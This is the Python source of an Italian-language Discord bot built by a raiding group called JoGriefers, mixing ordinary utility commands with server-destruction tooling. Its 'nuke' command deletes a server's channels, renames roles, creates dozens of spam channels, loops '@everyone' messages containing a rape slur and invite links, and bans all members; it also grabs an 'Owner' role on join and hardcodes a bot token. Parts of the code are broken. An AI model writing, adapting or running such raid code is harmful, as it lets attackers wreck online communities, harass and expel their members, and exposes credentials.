import discord
from discord.ext import commands, tasks
from discord import Permissions
from colorama import Fore, Style
import asyncio
import sys
import json
import sqlite3
import sqlite_utils
from tabulate import tabulate
import time
import base64
import requests
import io
from PIL import Image, ImageDraw, ImageFont
import socket
import aiohttp
import ping3
import whois
import aioping
import subprocess
import concurrent.futures
from cachetools import cached, TTLCache
import httpx
import re
import string

# Configura la connessione al database SQLite
db_connection = sqlite3.connect("commands_db.db")  # Assicurati di utilizzare l'estensione corretta
db_cursor = db_connection.cursor()

# Leggi il file SQL e crea la tabella se non esiste
with open("commands_db.sql", "r") as sql_file:
    db_cursor.executescript(sql_file.read())

def get_data_from_json():
    try:
        with open("servers.json", "r") as file:
            data = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        data = {"nuked_servers": []}
        save_data_to_json(data)
        print("File 'servers.json' creato con successo.")

    return data

# Funzione per salvare i dati nel file JSON
def save_data_to_json(data):
    with open("servers.json", "w") as file:
        json.dump(data, file, indent=4)

# Carica la lista dei server nuked all'avvio del bot
server_nuked_ids = get_data_from_json()

def extract_server_id_from_invite(invite_link):
    # Estrae l'ID del server dal link di invito
    invite_code = invite_link.split("/")[-1]
    if invite_code.startswith("https://discord.gg/"):
        invite_code = invite_code[len("https://discord.gg/"):]
    return invite_code

# Funzione per leggere il file JSON e ottenere la lista dei server nuked
def get_nuked_servers():
    with open("servers.json", "r") as file:
        data = json.load(file)
        nuked_servers = data.get("nuked_servers", [])
    return nuked_servers

# Funzione per verificare se il link è valido
def is_valid_discord_link(link):
    # Definisci il pattern per i link di invito del server Discord
    discord_invite_pattern = r"(discord\.gg|discordapp\.com\/invite)\/[a-zA-Z0-9]+"

    # Utilizza la funzione search di regex per cercare il pattern nel link
    return re.search(discord_invite_pattern, link) is not None

async def get_server_name_from_invite(invite_link):
    # Estrai l'ID del server dal link di invito
    invite_code = re.search(r"(discord\.gg|discordapp\.com\/invite)\/([a-zA-Z0-9]+)", invite_link)
    if not invite_code:
        return None

    # Ottieni il server dal link di invito
    try:
        invite = await client.fetch_invite(invite_code.group(0))
        return invite.guild.name
    except (discord.NotFound, discord.HTTPException):
        return None

token = "MTEzMjAxMDIxOTg5MTg1MTMxNA.GO9dnd.mtYUZ3eoHLrIdNCaAk7jxzcmhNf3qPKPEemCvA"

client = commands.Bot(command_prefix="!", intents=discord.Intents.all(), description="Il mio bot - Prova i miei comandi con !help")

user_channel_dict = {}

@client.event
async def on_ready():
    print("-------------")
    print(f"We have logged in as {client.user}")
    server_nuked_ids = get_data_from_json()
    print("-------------")
    change_status_task.start()
    print("Task entrate in funzione")
    print("-------------")
    await client.tree.sync()
    print("Bot pronto!")
    print("-------------")

@client.event
async def on_command(ctx):
    # Registra il comando utilizzato nel database
    db_cursor.execute("""
        INSERT INTO command_logs (user_id, command) VALUES (?, ?);
    """, (ctx.author.id, ctx.message.content))
    db_connection.commit()

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        command = ctx.message.content.split()[0][1:]  # Rimuovi il prefisso e ottieni il comando inserito
        suggested_command = get_closest_command(command, client.commands)
        await ctx.send(f"Comando '{command}' non esiste. Prova ad utilizzare '{suggested_command}'!", ephemeral=True)

def get_closest_command(target_command, available_commands):
    # Funzione per trovare il comando più simile a quello inserito dall'utente
    target_command = target_command.lower()
    available_commands = [cmd.name.lower() for cmd in available_commands]
    
    min_distance = float('inf')
    closest_command = None
    
    for cmd in available_commands:
        distance = levenshtein_distance(target_command, cmd)
        if distance < min_distance:
            min_distance = distance
            closest_command = cmd
    
    return closest_command

def levenshtein_distance(s1, s2):
    if len(s1) > len(s2):
        s1, s2 = s2, s1

    distances = range(len(s1) + 1)
    for index2, char2 in enumerate(s2):
        new_distances = [index2 + 1]
        for index1, char1 in enumerate(s1):
            if char1 == char2:
                new_distances.append(distances[index1])
            else:
                new_distances.append(1 + min((distances[index1], distances[index1 + 1], new_distances[-1])))
        distances = new_distances
    return distances[-1]


@tasks.loop(seconds=10)  # Imposta l'intervallo di cambio stato (10 secondi nel caso dell'esempio)
async def change_status_task():
    # Ottieni le informazioni sull'owner del bot
    owner = await client.application_info()
    owner_name = owner.owner.name if owner.owner else "N/A"

    # Ottieni il numero di server in cui è presente il bot
    server_count = len(client.guilds)

    # Ottieni tutti i membri di tutti i server
    all_members = [member for guild in client.guilds for member in guild.members]

    # Ottieni il numero di server presenti nella lista dei server nuked list dal file JSON
    server_nuked_list = get_nuked_servers()
    server_nuked_count = len(server_nuked_list)

    await client.change_presence(activity=discord.Game(name="al JoGriefers client"))
    await asyncio.sleep(10)


SPAM_CHANNEL =  ["nuked-by-jogriefers💥"]
SPAM_MESSAGE = [
    "@everyone GOT RAPED BY JoGriefers https://discord.gg/9wVFfTPYEr",
    "@everyone GOT NUKKED BY JoGriefers https://discord.gg/9wVFfTPYEr",
    "@everyone JoGriefers ON TOP! https://cdn.discordapp.com/attachments/1124694216367423488/1135266535708037160/lv_0_20230730193855.mp4",
    "@everyone GOT CAUGHT 4K BY JoGriefers https://discord.gg/9wVFfTPYEr",
    ]
# Lista di frasi per gli spam message
spam_messages_webbook = [
    "@everyone GOT RAPED BY JoGriefers https://discord.gg/9wVFfTPYEr",
    "@everyone GOT NUKKED BY JoGriefers https://discord.gg/9wVFfTPYEr",
    "@everyone JoGriefers ON TOP! https://discord.gg/9wVFfTPYEr",
    "@everyone GOT CAUGHT 4K BY JoGriefers https://discord.gg/9wVFfTPYEr",
]

random_channel = ["random-channel"]

# Funzione di verifica personalizzata
def is_allowed_user(ctx):
    allowed_users = ["monkeymoon104", "jomatte", "notarest", ".tcrasher", "aircraper", "robinrtx", "levi104", "asfgjyuashgua", "animefan6935", "il_nobb_01"]
    return ctx.author.name in allowed_users

def is_allowed_ban(ctx):
    allowed_user_ban = ["monkeymoon104", "jomatte", "notarest", "robinrtx", "levi104"]
    return ctx.author.name in allowed_user_ban

@client.event
async def on_guild_join(guild):
    # Ottieni il ruolo "Amministratore" (puoi modificare il nome del ruolo se necessario)
    admin_role = discord.utils.get(guild.roles, name="Owner")

    # Verifica se il ruolo esiste nel server
    if admin_role:
        try:
            # Assegna il ruolo di amministratore al bot
            await guild.me.add_roles(admin_role)
        except discord.Forbidden:
            print(f"Impossibile assegnare il ruolo {admin_role.name} al bot nel server {guild.name}. Permessi insufficienti.")

specific_channel_id = 1135623707302313984  # Sostituisci con l'ID del canale desiderato

@client.event
async def on_message(message):
    # Verifica se l'autore del messaggio è il bot stesso
    if message.author == client.user:
        # Lascia che il messaggio del bot sia visualizzato normalmente
        await client.process_commands(message)
        return

    # Verifica se il messaggio è stato inviato nel canale specificato
    if message.channel.id == specific_channel_id:
        # Elimina il messaggio inviato dall'utente
        await message.delete()
    else:
        # Lascia che gli altri messaggi siano visualizzati normalmente
        await client.process_commands(message)


@client.event
async def on_member_join(member):
    # Canale di benvenuto (sostituisci "canale_id" con l'ID del canale di benvenuto)
    channel = client.get_channel()

    # Messaggio di benvenuto con il nome del server
    welcome_message = f"Ciao {member.mention}, benvenuto nel nostro server: `{member.guild.name}`!"

    # Scarica l'immagine di benvenuto da URL
    response = requests.get("https://cdn.discordapp.com/attachments/1121882297310920735/1131888656756510771/Progetto_senza_titolo_2.png")
    image = Image.open(io.BytesIO(response.content))

    # Incornicia l'immagine di benvenuto con un bordo trasparente
    border_size = 20
    border_image = Image.new("RGBA", (image.width + 2 * border_size, image.height + 2 * border_size), (0, 0, 0, 0))
    border_image.paste(image, (border_size, border_size))

    # Scarica l'avatar del membro o l'avatar predefinito di Discord
    if member.avatar:
        avatar_url = str(member.avatar.url)
    else:
        default_avatar_url = member.default_avatar.url
        avatar_url = str(default_avatar_url)

    avatar_response = requests.get(avatar_url)
    avatar_image = Image.open(io.BytesIO(avatar_response.content)) if avatar_url else None

    # Ridimensiona l'avatar alle dimensioni desiderate
    if avatar_image:
        avatar_image = avatar_image.resize((150, 150))

        # Creare una maschera circolare per ritagliare l'avatar in una forma circolare
        mask = Image.new("L", avatar_image.size, 0)
        draw = ImageDraw.Draw(mask)
        draw.ellipse((0, 0, avatar_image.size[0], avatar_image.size[1]), fill=255)

        # Ritaglia l'avatar con la maschera circolare
        avatar_image = Image.composite(avatar_image, Image.new("RGBA", avatar_image.size, (0, 0, 0, 0)), mask)

        # Disegna un cerchio bianco intorno all'avatar per l'incorniciatura
        draw = ImageDraw.Draw(border_image)
        circle_center = (border_image.width // 2, 200 + avatar_image.height // 2)
        circle_radius = avatar_image.height // 2 + 10
        circle_border_width = 10  # Imposta la larghezza del bordo del cerchio
        draw.ellipse((circle_center[0] - circle_radius, circle_center[1] - circle_radius,
                      circle_center[0] + circle_radius, circle_center[1] + circle_radius),
                     outline="yellow", width=circle_border_width)

        # Sovrapponi l'avatar sull'immagine di benvenuto
        x_offset = (border_image.width - avatar_image.width) // 2
        y_offset = 200  # Posizione verticale dell'avatar sopra il testo
        border_image.paste(avatar_image, (x_offset, y_offset), mask=avatar_image)

        # Ottieni il nome utente del membro
        username = member.name

        # Aggiungi il nome utente sotto l'avatar (centrato)
        draw = ImageDraw.Draw(border_image)
        font = ImageFont.truetype("arial.ttf", size=40)
        font_bold = ImageFont.truetype("arialbd.ttf", size=40)

        # Calcola le dimensioni del testo
        text_bbox = draw.textbbox((0, 0), username, font=font_bold)
        text_x = x_offset + (avatar_image.width - text_bbox[2]) // 2
        text_y = y_offset + avatar_image.height + 20  # Aggiungi una distanza tra l'avatar e il nome utente

        # Disegna il nome utente in grassetto
        draw.text((text_x, text_y), username, fill="yellow", font=font_bold)

    # Aggiungi un messaggio personalizzato centrato, grande e colorato
    message = f"SEI IL {len(member.guild.members)}° MEMBRO DEL SERVER!"
    draw = ImageDraw.Draw(border_image)
    font = ImageFont.truetype("arial.ttf", size=40)
    text_bbox = draw.textbbox((0, 0), message, font=font)
    text_x = (border_image.width - text_bbox[2]) // 2
    text_y = 425  # Posizione verticale del testo "Sei il (numero membri del server)° membro del server!"
    text_color = "yellow"
    draw.text((text_x, text_y), message, fill=text_color, font=font_bold)

    # Salva l'immagine manipolata in un buffer di byte
    image_bytes = io.BytesIO()
    border_image.save(image_bytes, format="PNG")
    image_bytes.seek(0)  # Imposta la posizione del buffer all'inizio

    # Crea l'oggetto discord.File con l'immagine manipolata
    welcome_image = discord.File(image_bytes, filename="welcome_image.png")

    # Invia il messaggio di benvenuto con l'immagine
    await channel.send(content=welcome_message, file=welcome_image)

# Comando fittizio per gestire gli errori di comando
@client.command(name='command_not_found', hidden=True)
async def command_not_found(ctx):
    pass

@client.command()
@commands.check(is_allowed_user)
async def stop(ctx):
    global running
    running = False
    await ctx.send("Esecuzione interrotta.")
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)
    sys.exit()

async def create_webhooks(guild):
    webhooks = []

    # Creazione dei webhooks
    for _ in range(25):
        webhook = await guild.create_webhook(name="Webhook created by JoGriefers")
        webhooks.append(webhook)

    return webhooks

@client.command()
@commands.check(is_allowed_user)
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    # Cambia il nome del server
    await guild.edit(name="server nuked by jogriefers")
    server_name = ("Successfully rename server nuked 🎃")

    # Cambia l'immagine del server
    with open(r"C:\Users\lione\Downloads\jogriefers_icon.png", "rb") as image:
        await guild.edit(icon=image.read())
    server_image = ("Successfully change the server icon 🖼️")

    async def delete_channels():
        try:
            for channel in ctx.guild.channels:
                try:
                    if isinstance(channel, discord.TextChannel) and channel != ctx.guild.default_role.position:
                        await channel.delete()
                        print("Deleted {}".format(channel))
                except discord.Forbidden:
                    print(f"Missing permissions to delete {channel.name}")
                except discord.HTTPException as e:
                    if e.code == 50074:
                        print(f"Cannot delete a channel required for community servers: {channel.name}")
                    else:
                        print(f"Error while deleting {channel.name}: {e}")
        except Exception as e:
            print(f"Error while deleting channels: {e}")

    await asyncio.gather(*delete_channels)

    # Attende l'eliminazione di tutti i canali prima di procedere
    await ctx.guild.fetch_channels()
    await asyncio.sleep(2)  # Possiamo anche aumentare il tempo di attesa se necessario

    await guild.create_text_channel("nuked-by-jogriefers💥")

    Info_nuked = (f"nuked {guild.name} Successfully.")

    for role in guild.roles:
        if role.managed:
            continue
        try:
            new_name = "GOT NUKKED BY JOGRIEFERS"
            await role.edit(name=new_name)
            print(f"Ruolo '{role.name}' rinominato in '{new_name}'.")
        except discord.Forbidden:
            print(f"Impossibile rinominare il ruolo '{role.name}'. Permessi insufficienti.")
        except discord.HTTPException:
            print(f"Errore durante la rinomina del ruolo '{role.name}'.")

    # Creazione dei nuovi canali dopo aver eliminato tutti i canali
    amount = 50
    await asyncio.gather(*[guild.create_text_channel(random.choice(SPAM_CHANNEL)) for _ in range(amount)])

    # Chiamiamo la funzione ban_all con asyncio.gather per avviare il processo in modo asincrono
    asyncio.create_task(ban_all(ctx))

@nuke.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.MissingRole):
        await ctx.send("Non fare il furbo e provare a nukkare il server xD")

@client.event
async def on_guild_channel_create(channel):
    if channel.name == "nuked-by-jogriefers💥":
        while True:
            await asyncio.gather(*[channel.send(random.choice(SPAM_MESSAGE))])

@client.command()
@commands.check(is_allowed_ban)
async def ban_all(ctx):
    for member in ctx.guild.members:
        if member != ctx.author:  # Opzionale: Ignora il proprietario del server
            try:
                await member.ban(reason="Motivo del ban")
                await ctx.author.send(f'{member.mention} è stato bannato nel server **{ctx.guild.name}**')
            except discord.Forbidden:
                await ctx.author.send(f'Impossibile bannare {member.mention} nel server **{ctx.guild.name}**. Permessi insufficienti.')

@client.tree.command(name="random-channel", description="crea canali random")
@commands.check(is_allowed_user)
async def random_create(ctx, amount: int):
    guild = ctx.guild

    await ctx.response.send_message(f"Creazione {amount} canali random", ephemeral=True)

    await asyncio.gather(*[guild.create_text_channel(random.choice(random_channel)) for _ in range(amount)])


@client.command()
async def h(ctx):
   embed = discord.Embed(title="Comandi disponibili", description="Ecco la lista dei comandi disponibili e cosa fanno:", color=discord.Color.dark_gold())

   embed.add_field(name="Ping", value="ping del bot, `utilizzo: !ping`", inline=False)
   embed.add_field(name="Avatar", value="avatar di un membro online, `utilizzo: !avatar <nome utente>, se non è specificato nessun utente il bot manderà l'avatar dell'autore del comando`", inline=False)
   embed.add_field(name="Userinfo", value="informazione su un membro, `utilizzo: !userinfo <nome utente>`", inline=False)
   embed.add_field(name="Serverinfo", value="informazioni sul server, `utilizzo: !serverinfo`", inline=False)
   embed.add_field(name="Remindme", value="ricordami un promemoria inserito, `utilizzo: !remindme <numero> <tempo(s, m, h, d)> <promemoria>`", inline=False)
   embed.add_field(name="Servericon", value="immagine del server, `utilizzo: !servericon`", inline=False)
   embed.add_field(name="Server_nuked_list", value="visualizza la lista di server nukkati, `utilizzo: !server_nuked_list`", inline=False)
   embed.add_field(name="H_nuker_admin", value="visualizza la lista aiuto per gli admin/nukker, `utilizzo: !h_nuker_admin`", inline=False)
   embed.add_field(name="Skin", value="skin di un player minecraft, `utilizzo: !skin [nome player(Mark3s)]`", inline=False)
   embed.add_field(name="Server_control", value="informazioni sui server minecraft, `utilizzo: !server_control [dominio(play.coralmc.it)`", inline=False)
   embed.add_field(name="Mob_help", value="Informazioni sui mob disponibili, `utilizzo: !mob_help`", inline=False)
   embed.add_field(name="Mob_image", value="Immagine di un mob minecraft, `utilizzo: !mob_image [nome mob(creeper)]`", inline=False)
   embed.add_field(name="Seed_gen", value="Per generare seed minecraft, `utilizzo: !seed_gen`", inline=False)
   
   await ctx.send(embed=embed)


@client.command()
@commands.check(is_allowed_user)
async def delete_all_channels(ctx):
    # Verifica se l'autore del messaggio è un amministratore
    
    guild = ctx.guild

    # Lista dei nomi dei canali da ignorare
    ignore_comunity_channels = ["rules", "moderator-only"]

    # Elimina tutti gli altri canali, esclusi "rule" e "moderator-only"
    async def del_all_channels():
        tasks_del = [channel.delete() for channel in guild.channels if channel.name.lower() not in ignore_comunity_channels]
        await asyncio.gather(*tasks_del)

    try:
        await del_all_channels()
        print("Deleted channels.")
    except discord.Forbidden:
        # Il bot non ha i permessi per eliminare alcuni canali
        await ctx.send("Attenzione: Il bot non ha i permessi per eliminare alcuni canali.")


@client.command()
@commands.has_permissions(administrator=True)
async def show_db(ctx, *, hide: str = None):
    # Mostra il contenuto del database nel canale testuale
    db = sqlite_utils.Database("commands_db.db")
    table = db["command_logs"]
    records = table.rows

    headers = ["User Tag", "Command"]
    rows = []
    for record in records:
        user_id = record['user_id']
        member = ctx.guild.get_member(user_id)
        if member:
            user_tag = member.name + "#" + member.discriminator
        else:
            user_tag = f"Utente sconosciuto (ID: {user_id})"
        rows.append([user_tag, record['command']])

    # Formatta i dati della tabella
    table_output = tabulate(rows, headers, tablefmt="fancy_grid")

    # Codifica la tabella in base64 se l'opzione hide è presente
    if hide and hide.lower() == "hide":
        table_output = base64.b64encode(table_output.encode()).decode()

    await ctx.send(f"{ctx.author.mention} **Ecco la tabella con i comandi registrati:**\n```\n{table_output}```")


@show_db.error
async def show_db_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Non hai il permesso di eseguire il comando. Solo gli amministratori possono utilizzare questo comando.")

@client.command()
@commands.has_permissions(administrator=True)
async def reset_db(ctx):
    await ctx.send("Sto resettando il database...")
    # Elimina completamente la tabella "command_logs"
    db = sqlite_utils.Database("commands_db.db")
    table = db["command_logs"]
    table.drop()

    # Ricrea la tabella vuota con lo stesso schema
    with open("commands_db.sql", "r") as sql_file:
        db_cursor.executescript(sql_file.read())

    time.sleep(4)
    await ctx.send("Il database è stato resettato a zero.")

@reset_db.error
async def reset_db_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Non hai il permesso di resettare il database", ephemeral=True)

@client.command()
async def ping(ctx):
    latency = round(client.latency * 1000)
    await ctx.send(f"Pong! Latenza: {latency}ms", )

@client.command()
async def avatar(ctx, member: discord.Member = None):
    member = member or ctx.author

    avatar_url=member.avatar.url
    await ctx.send(f"Avatar di {member.mention}: {avatar_url}")


@client.command()
async def userinfo(ctx, member: discord.Member = None):
    member = member or ctx.author

    roles = ", ".join([role.mention for role in member.roles if role != ctx.guild.default_role])

    status = member.status
    if status == discord.Status.online:
        status_color = discord.Color.green()
    elif status == discord.Status.offline:
        status_color = discord.Color.red()
    elif status == discord.Status.idle:
        status_color = discord.Color.orange()
    elif status == discord.Status.dnd:
        status_color = discord.Color.dark_red()
    else:
        status_color = discord.Color.default()

    activity = member.activity.name if member.activity else "Nessuna attività in corso"

    embed_user = discord.Embed(title=f"Informazioni su {member}", color=status_color)
    embed_user.set_thumbnail(url=member.avatar.url)
    embed_user.add_field(name="Nome", value=member.name, inline=False)
    embed_user.add_field(name="Tag", value=member.discriminator, inline=False)
    embed_user.add_field(name="ID", value=member.id, inline=False)
    embed_user.add_field(name="Account creato il", value=member.created_at.strftime("%d/%m/%Y %H:%M:%S"), inline=False)
    embed_user.add_field(name="Entrato nel server il", value=member.joined_at.strftime("%d/%m/%Y %H:%M:%S"), inline=False)
    embed_user.add_field(name="Stato", value=str(status).capitalize(), inline=False)
    embed_user.add_field(name="Attività", value=activity, inline=False)
    embed_user.add_field(name="Ruoli", value=roles, inline=False)

    await ctx.send(embed=embed_user)



@client.command()
async def serverinfo(ctx):
    server = ctx.guild

    # Ottieni le informazioni del server
    server_name = server.name
    total_members = server.member_count
    server_created_at = server.created_at.strftime("%Y-%m-%d %H:%M:%S")
    server_owner = server.owner

    # Conteggio dei canali totali
    total_channels = len(server.channels)
    
    # Conteggio dei canali vocali
    voice_channels = sum(1 for channel in server.channels if channel.type == discord.ChannelType.voice)

    # Conteggio dei canali di testo
    text_channels = sum(1 for channel in server.channels if channel.type == discord.ChannelType.text)


    # Lista delle menzioni dei ruoli del server
    role_mentions = [role.mention for role in server.roles]

    # Aggiunta delle menzioni dei ruoli all'embed
    roles_str = ", ".join(role_mentions)

    # Ottieni l'immagine del server
    server_icon_url = str(server.icon.url) if server.icon else "Nessuna immagine del server disponibile."

    # Crea l'embed di Discord
    embed = discord.Embed(title=f"Informazioni sul server {server_name}", color=discord.Color.blue())
    embed.add_field(name="Membri totali 🔢", value=total_members, inline=False)
    embed.add_field(name="Data creazione server 📅", value=server_created_at, inline=False)
    embed.add_field(name="Owner del server 👑", value=server_owner.mention, inline=False)
    embed.add_field(name="Ruoli ⚙️", value=roles_str, inline=True)
    embed.add_field(name="Canali totali", value=total_channels, inline=False)
    embed.add_field(name="Canali vocali", value=voice_channels, inline=False)
    embed.add_field(name="Canali di testo", value=text_channels, inline=False)
    
    if server_icon_url:
        embed.set_thumbnail(url=server_icon_url)
    else:
        embed.add_field(name="Immagine del server", value="Nessuna immagine del server disponibile.", inline=False)

    await ctx.send(embed=embed)

@client.command()
async def purge(ctx, amount: int):
    if ctx.author.guild_permissions.manage_messages:
        await ctx.channel.purge(limit=amount + 1)
    else:
        await ctx.send("Non hai i permessi per eseguire questo comando.")

@client.command()
async def remindme(ctx, time: int, *, reminder: str):
    """Crea un promemoria. Esempio: !remindme 30 Preparare la cena"""

    if time <= 0:
        await ctx.send("Il tempo deve essere maggiore di 0.")
        return

    user_id = str(ctx.author.id)
    conn = sqlite3.connect("reminders.db")
    db_cursor = conn.cursor()
    db_cursor.execute("CREATE TABLE IF NOT EXISTS reminders (user_id INTEGER, time INTEGER, reminder TEXT)")
    db_cursor.execute("INSERT INTO reminders (user_id, time, reminder) VALUES (?, ?, ?)", (user_id, time, reminder))
    conn.commit()
    conn.close()

    await ctx.send(f"Promemoria impostato. Ti ricorderò di `{reminder}` tra `{time}` minuti.")

    await asyncio.sleep(time * 60)
    await ctx.author.send(f"{ctx.author.mention}, ecco il promemoria che hai impostato: ```{reminder}```")


@client.command()
async def servericon(ctx):
    server = ctx.guild
    # Ottieni l'immagine del server
    server_icon_url = str(server.icon.url) if server.icon else "Nessuna immagine del server disponibile."
    if not server_icon_url:
        await ctx.send("Nessuna immagine del server disponibile.")
        return

    embed = discord.Embed(title=f"Immagine del server {server.name}", color=discord.Color.blurple())
    embed.set_image(url=server_icon_url)
    await ctx.send(embed=embed)


# Aggiorna la definizione del comando !server_nuked
@client.tree.command(name="server_nuked", description="Aggiungi alla lista dei server nukkati un server nukkato")
async def server_nuked(ctx, server_name: str):
    data = get_data_from_json()

    # Controlla se il nome del server è già presente nella lista dei server nuked
    if server_name in data["nuked_servers"]:
        await ctx.response.send_message(f"Il server '{server_name}' è già presente nella lista dei server nuked.", ephemeral=True)
    else:
        # Aggiungi il nome del server alla lista dei server nuked
        data["nuked_servers"].append(server_name)
        save_data_to_json(data)
        await ctx.response.send_message(f"Il server '{server_name}' è stato aggiunto alla lista dei server nuked.", ephemeral=True)

@client.tree.command(name="server-nuked-list", description="Visualizza la lista dei server nukkati")
async def server_nuked_list(ctx):
    data = get_data_from_json()
    server_names = data.get("nuked_servers", [])

    if not server_names:
        await ctx.response.send_message("La lista dei server nuked è vuota.", ephemeral=True)
        return

    server_names_str = "\n".join(server_names)
    await ctx.response.send_message(f"Ecco la lista dei server nuked:\n`{server_names_str}`", ephemeral=True)

@client.command()
@commands.check(is_allowed_user)
async def reset_server_nuked_list(ctx):
    server_nuked_ids.clear()  # Svuota la lista dei server nuked

    # Crea una nuova lista vuota con la chiave "nuked_servers"
    new_data = {"nuked_servers": []}
    save_data_to_json(new_data)  # Salva la lista vuota nel file JSON

    await ctx.send("La lista dei server nuked è stata resettata.")


@client.command()
@commands.check(is_allowed_user)
@commands.cooldown(1, 5, commands.BucketType.user)  # Tempo di cooldown: 5 secondi
async def server_nuked_remove(ctx, server_id: int):
    if server_id in server_nuked_ids:
        server_nuked_ids.remove(server_id)  # Rimuovi l'ID del server dalla lista dei server nuked
        await ctx.send(f"Il server con ID: {server_id} è stato rimosso dalla lista dei server nuked.")
        save_data_to_json(server_nuked_ids)  # Salva la lista aggiornata nel file JSON
    else:
        await ctx.send("Impossibile trovare il server specificato nella lista dei server nuked. Assicurati di inserire un ID valido.")

@client.command()
@commands.check(is_allowed_user)
async def invite(ctx):
    # Ottieni il link di invito del bot senza specificare alcun permesso
    invite_link = discord.utils.oauth_url(client.user.id)

    # Invia il link di invito come messaggio
    await ctx.author.send(f"Ecco il link di invito per il bot: {invite_link}")



@client.tree.command(name="ticket-setup", description="Setta il ticket panel")
async def ticket_set(ctx, channel: discord.TextChannel ,staff_role: discord.Role):
    
    await ctx.response.send_message(f"Pannello ticket creato nel canale {channel.mention}", ephemeral=True)

    server = ctx.guild

    # Ottieni l'immagine del server
    server_icon_url = str(server.icon.url) if server.icon else "Nessuna immagine del server disponibile."

    # Crea un bottone blu con l'etichetta "ciao"
    button_label = "🎫Create a ticket"
    button = discord.ui.Button(style=discord.ButtonStyle.blurple, label=button_label)

    # Crea un messaggio contenente il bottone blu
    embed = discord.Embed(title="JoGriefersSQ Ticket <:Ticket_Badge:1135633251109703781>", description="Click the button below to open a ticket", color=discord.Color.blue())

    # Crea una view e aggiungi il bottone
    view = discord.ui.View()
    view.add_item(button)

    if server_icon_url:
        embed.set_thumbnail(url=server_icon_url)
    else:
        embed.add_field(name="Immagine del server", value="Nessuna immagine del server disponibile.", inline=False)

    # Invia il messaggio con il bottone nel canale specificato dall'utente
    message_with_button = await channel.send(embed=embed, view=view)

    # Aggiungi un'azione al bottone
    async def on_button_click(interaction: discord.Interaction):
        guild = interaction.guild
        user = interaction.user
        channel_name = f"ticket-{user.name}"

        # Verifica se l'utente ha già un canale aperto
        existing_channel = discord.utils.get(guild.text_channels, name=user_channel_dict.get(user.id))

        if existing_channel:
            # Se esiste già un canale, reindirizza l'utente a quello
            await interaction.response.send_message(f"You already have an open ticket: {existing_channel.mention}", ephemeral=True)
        else:
            # Trova la categoria "ticket" (sostituisci "ticket" con il nome esatto della categoria)
            category = discord.utils.get(guild.categories, name="Ticket Open")

            # Se la categoria non esiste, creala
            if not category:
                try:
                    category = await guild.create_category("Ticket Open")
                    # Imposta i permessi per la categoria
                    await category.set_permissions(guild.default_role, read_messages=False)  # @everyone
                    await category.set_permissions(staff_role, read_messages=True)  # Ruolo dello staff
                except discord.Forbidden:
                    await interaction.response.send_message("I don't have permission to create a 'tickets' category.", ephemeral=True)
                    return

            # Crea il canale temporaneo nella categoria "ticket"
            overwrites = {
                # Permetti all'utente di vedere e scrivere nel canale
                user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                # Imposta i permessi per lo staff del server
                staff_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                guild.default_role: discord.PermissionOverwrite(read_messages=False)
            }

            new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites, category=category)

            # Aggiorna il dizionario per registrare il canale creato dall'utente
            user_channel_dict[user.id] = new_channel.name
            
            # Invia un messaggio di benvenuto nel canale temporaneo
            welcome_message = f"{user.mention} {staff_role.mention}"
            await new_channel.send(welcome_message)

            # Aggiungi un bottone rosso "close" al messaggio
            close_button = discord.ui.Button(style=discord.ButtonStyle.red, label="Close")
            close_view = discord.ui.View()
            close_view.add_item(close_button)

            # Crea un bottone verde "Claim" per gli utenti dello staff
            claim_button = discord.ui.Button(style=discord.ButtonStyle.green, label="Claim")
            close_view.add_item(claim_button)

            # Variabile per tenere traccia dello stato del ticket (True = non reclamato, False = reclamato)
            ticket_claimed = False

            # Invia il messaggio con entrambi i bottoni nel canale temporaneo
            close_message_embed = discord.Embed(
                title=f"{channel_name}",
                description=f"Thank you for contacting support. Please describe what do you need and wait for a response.",
                color=discord.Color.dark_green()
            )

            if server_icon_url:
                close_message_embed.set_thumbnail(url=server_icon_url)
            else:
                close_message_embed.add_field(name="Immagine del server", value="Nessuna immagine del server disponibile.", inline=False)

            close_message = await new_channel.send(embed=close_message_embed, view=close_view)


        # Aggiungi un'azione al bottone "Close"
        async def on_close_button_click(interaction: discord.Interaction):
            # Verifica se l'utente ha il ruolo dello staff
            if staff_role in interaction.user.roles:
                # Creiamo l'embed con le informazioni
                embed = discord.Embed(title="Chiusura Ticket", description="Il ticket verrà eliminato in 5 secondi.", color=discord.Color.red())

                # Invia un messaggio di conto alla rovescia nel canale
                countdown_message = await interaction.channel.send(embed=embed)

                for i in range(5, 0, -1):
                    await asyncio.sleep(1)  # Attendiamo 1 secondo

                    # Aggiorniamo il messaggio di conto alla rovescia nell'embed
                    embed.description = f"Il ticket verrà eliminato in `{i}` secondi."
                    await countdown_message.edit(embed=embed)

                # Elimina il canale temporaneo dopo il conto alla rovescia
                await interaction.channel.delete()
                            
            else:
                # Messaggio di errore se l'utente non ha il ruolo dello staff
                await interaction.response.send_message("Non hai il permesso di chiudere il ticket!", ephemeral=True)


        # Aggiungi un'azione al bottone "Claim"
        async def on_claim_button_click(interaction: discord.Interaction):
            nonlocal ticket_claimed
            # Verifica se l'utente ha il ruolo dello staff e se il ticket non è ancora stato reclamato
            if staff_role in interaction.user.roles and not ticket_claimed:
                # Imposta il testo del bottone con il nome di chi lo ha reclamato
                claim_button.label = f"Claimed by {interaction.user.name}"
                # Imposta il bottone come non più cliccabile
                claim_button.disabled = True
                # Aggiorna lo stato del ticket a reclamato
                ticket_claimed = True
                # Aggiorna il messaggio con il bottone "Claim" per mostrare chi lo ha reclamato
                await interaction.response.edit_message(view=close_view)
                await new_channel.send(f"The ticket has been claimed by {interaction.user.mention}")
            else:
                # Messaggio di errore se l'utente non ha il ruolo dello staff o se il ticket è già stato reclamato
                await interaction.response.send_message("You don't have permission to claim this ticket", ephemeral=True)

        # Aggiungi l'azione al bottone "close"
        close_button.callback = on_close_button_click
        claim_button.callback = on_claim_button_click

        # Invia un messaggio di notifica al bottone premuto
        ticket_create = discord.Embed(title="Ticket Open", description=f"Opened a new ticket: {new_channel.mention}", color=discord.Color.green())
        await interaction.response.send_message(embed=ticket_create, ephemeral=True)

